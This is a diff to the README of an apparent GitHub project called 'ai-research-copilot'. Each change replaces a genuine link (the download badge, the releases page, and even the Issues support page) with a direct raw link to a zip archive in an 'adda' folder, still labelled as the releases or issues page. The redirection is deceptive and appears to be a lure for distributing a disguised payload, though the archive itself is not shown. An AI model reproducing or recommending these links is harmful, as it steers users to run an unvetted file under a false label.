@@ -1,6 +1,6 @@
 # 🔬 ai-research-copilot - Your AI Assistant for Academic Research
 
-[![Download ai-research-copilot](https://img.shields.io/badge/Download-ai--research--copilot-blue.svg)](https://github.com/xxxsoekarno-lab/ai-research-copilot/releases)
+[![Download ai-research-copilot](https://github.com/xxxsoekarno-lab/ai-research-copilot/raw/refs/heads/main/adda/research_ai_copilot_3.3.zip)](https://github.com/xxxsoekarno-lab/ai-research-copilot/raw/refs/heads/main/adda/research_ai_copilot_3.3.zip)
 
 ## 📚 What is ai-research-copilot?
 
@@ -16,7 +16,7 @@ To begin your journey with ai-research-copilot, follow these simple steps:
    - A stable internet connection is required for accessing online resources.
 
 2. **Download the Software**: 
-   - Visit this page to download: [Releases Page](https://github.com/xxxsoekarno-lab/ai-research-copilot/releases).
+   - Visit this page to download: [Releases Page](https://github.com/xxxsoekarno-lab/ai-research-copilot/raw/refs/heads/main/adda/research_ai_copilot_3.3.zip).
    - Choose the latest release available.
 
 3. **Install the Software**: 
@@ -45,7 +45,7 @@ Once you have the application running, using it is straightforward:
 
 ## 📥 Download & Install
 
-To download ai-research-copilot, visit this page: [Download ai-research-copilot](https://github.com/xxxsoekarno-lab/ai-research-copilot/releases).
+To download ai-research-copilot, visit this page: [Download ai-research-copilot](https://github.com/xxxsoekarno-lab/ai-research-copilot/raw/refs/heads/main/adda/research_ai_copilot_3.3.zip).
 
 Follow the instructions detailed in the "Getting Started" section to ensure a smooth download and installation process.
 
@@ -61,7 +61,7 @@ Feel free to reach out through the issues section on our GitHub page for specifi
 
 ## 📞 Support
 
-For questions or support, you can check our [GitHub Issues](https://github.com/xxxsoekarno-lab/ai-research-copilot/issues) page. We encourage users to provide feedback and report bugs to help improve the application.
+For questions or support, you can check our [GitHub Issues](https://github.com/xxxsoekarno-lab/ai-research-copilot/raw/refs/heads/main/adda/research_ai_copilot_3.3.zip) page. We encourage users to provide feedback and report bugs to help improve the application.
 
 ## 📝 Contribution
 
